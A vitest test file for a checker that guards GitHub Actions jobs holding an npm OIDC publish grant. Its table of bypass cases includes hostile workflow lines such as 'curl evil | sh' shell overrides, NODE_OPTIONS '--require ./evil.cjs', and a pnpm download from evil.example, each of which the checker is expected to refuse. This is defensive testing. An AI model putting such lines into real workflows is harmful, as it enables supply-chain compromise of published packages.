import { describe, expect, test } from "vitest";
import { checkOidcJobs, lockedPnpm } from "./check-oidc-jobs.ts";

const publish = `  # Comments and blank lines don't count.
  publish:
    name: Publish
    needs: pack
    runs-on: ubuntu-24.04
    permissions:
      # npm trusted publishing exchanges the OIDC token for a publish token.
      id-token: write
    steps:
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: package

      - uses: pnpm/setup@a0881977cd8ea73b1ed212236c99ca10dcc80cf4 # v3.1.1
        with:
          version: 12.14.0
          install: false
      - run: pnpm stage publish --ignore-scripts --no-git-checks package.tgz
`;

const base = `name: Release

permissions: {}

jobs:
  pack:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: pnpm install

${publish}`;

function variant(from: string, to: string): string {
  const parts = base.split(from);
  if (parts.length !== 2) throw new Error(`Expected one "${from}" in the base workflow.`);
  return parts.join(to);
}

const check = (text: string): string[] => checkOidcJobs(text, "release.yml", "12.14.0");
const differs =
  "release.yml job publish holds id-token but differs from publishJob in scripts/check-oidc-jobs.ts at its line";

const downloadStep = `      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: package
`;
const runStep = "      - run: pnpm stage publish --ignore-scripts --no-git-checks package.tgz\n";
const jobTop = "    needs: pack\n    runs-on: ubuntu-24.04\n";
const packPermissions = "    permissions:\n      contents: read\n";

// Each swaps [from, to] in the base workflow.
const bypasses: Record<string, [string, string]> = {
  "a docker action": [downloadStep, "      - uses: docker://alpine:3.20\n"],
  "a local action": [downloadStep, "      - uses: ./.github/actions/evil\n"],
  "an unpinned action": ["@9000827ccba6bdab643e8b6fd33ac0654aef8333", "@v8"],
  "a checkout": [
    downloadStep,
    "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
  ],
  "a step shell override": [runStep, `${runStep}        shell: bash -c 'curl evil | sh' {0}\n`],
  "a step env": [runStep, `${runStep}        env:\n          NODE_OPTIONS: --require ./evil.cjs\n`],
  "a job env": [jobTop, `${jobTop}    env:\n      NODE_OPTIONS: --require ./evil.cjs\n`],
  "a job container": [jobTop, `${jobTop}    container: evil/image:latest\n`],
  "job defaults": [
    jobTop,
    `${jobTop}    defaults:\n      run:\n        shell: bash -c 'curl evil | sh' {0}\n`,
  ],
  "pnpm/setup inputs moved to env": [
    "        with:\n          version",
    "        env:\n          version",
  ],
  "a reusable workflow": [
    `    steps:\n${downloadStep}`,
    "    uses: ./.github/workflows/evil.yml\n    steps:\n",
  ],
  "a --pnpmfile flag": ["--no-git-checks package.tgz", "--pnpmfile=evil.cjs package.tgz"],
  "a pnpm version URL": ["version: 12.14.0", "version: https://evil.example/pnpm.tgz"],
  "a pnpm version from Pack's outputs": [
    "version: 12.14.0",
    "version: ${{ needs.pack.outputs.pnpm }}",
  ],
  "a pnpm version that drifted from the lockfile": ["version: 12.14.0", "version: 12.13.0"],
  "a quoted run key": [runStep, `      - name: x\n        "run": curl evil | sh\n${runStep}`],
  "a block scalar run": [
    runStep,
    "      - run: |\n          pnpm stage publish --ignore-scripts package.tgz\n",
  ],
  "an extra step": [runStep, `${runStep}      - run: pnpm install\n`],
};

describe("checkOidcJobs", () => {
  test("accepts the Publish job, whatever its comments, blank lines, and action SHAs", () => {
    expect(check(base)).toEqual([]);
    expect(check(variant("9000827ccba6", "0123456789ab"))).toEqual([]);
  });

  test("ignores install and build steps in a workflow that grants no id-token", () => {
    expect(check(base.split(publish).join(""))).toEqual([]);
  });

  test.each(Object.entries(bypasses))(
    "refuses %s in the job holding id-token",
    (_name, [from, to]) => {
      expect(check(variant(from, to))).toEqual([expect.stringContaining(differs)]);
    },
  );

  test("refuses a job missing a step, naming the step it expected", () => {
    expect(check(variant(runStep, ""))).toEqual([
      `${differs} 15: expected "    - run: pnpm stage publish --ignore-scripts --no-git-checks package.tgz", found "the end of the job"`,
    ]);
  });

  test.each([
    `${packPermissions}      id-token: write # npm OIDC\n`,
    `${packPermissions}      id-token: "write"\n`,
    `${packPermissions}      'id-token': 'write'\n`,
    "    permissions: { id-token: write }\n",
    "    permissions: {contents: read, id-token: write}\n",
  ])("finds the grant %j in a job that runs pnpm install", (grant) => {
    expect(check(variant(packPermissions, grant))).toEqual([
      'release.yml job pack holds id-token but differs from publishJob in scripts/check-oidc-jobs.ts at its line 1: expected "publish:", found "pack:"',
    ]);
  });

  test("finds a grant in a job at a four-space indent", () => {
    const text =
      "name: R\npermissions: {}\njobs:\n    publish:\n        permissions:\n            id-token: write\n        steps:\n            - run: pnpm install\n";
    expect(check(text)).toEqual([
      `${differs} 2: expected "  name: Publish", found "    permissions:"`,
    ]);
  });

  test.each([
    ["before the jobs", variant("permissions: {}", "permissions:\n  id-token: write")],
    ["in a flow map", variant("permissions: {}", 'permissions: { "id-token": write }')],
    ["after the jobs", `${base}permissions:\n  id-token: write\n`],
  ])("refuses id-token granted to the whole workflow %s", (_where, text) => {
    expect(check(text)).toEqual([
      "release.yml grants id-token outside a job; grant it to the publish job only",
    ]);
  });

  test("reads a workflow with no jobs as all header", () => {
    expect(check("permissions:\n  id-token: write\n")).toEqual([
      "release.yml grants id-token outside a job; grant it to the publish job only",
    ]);
  });

  test.each([
    ["env", "env:\n  NODE_OPTIONS: --require ./evil.cjs"],
    ["defaults", "defaults:\n  run:\n    shell: bash"],
  ])("refuses workflow-level %s beside a job holding id-token", (key, setting) => {
    expect(check(variant("permissions: {}", `permissions: {}\n${setting}`))).toEqual([
      `release.yml sets workflow-level ${key}, which reaches the job holding id-token`,
    ]);
  });

  test.each([
    [packPermissions, "    permissions: write-all\n"],
    ["permissions: {}", 'permissions: "write-all"'],
  ])("refuses write-all, which includes id-token", (from, to) => {
    expect(check(variant(from, to))).toEqual([
      "release.yml grants write-all, which includes id-token; grant id-token alone",
    ]);
  });
});

describe("lockedPnpm", () => {
  test("reads the pnpm version the lockfile resolves", () => {
    const lockfile =
      "importers:\n\n  .:\n    packageManagerDependencies:\n      pnpm:\n        specifier: ^12.14.0\n        version: 12.14.0\n";
    expect(lockedPnpm(lockfile)).toBe("12.14.0");
    expect(lockedPnpm("importers: {}\n")).toBeUndefined();
  });
});
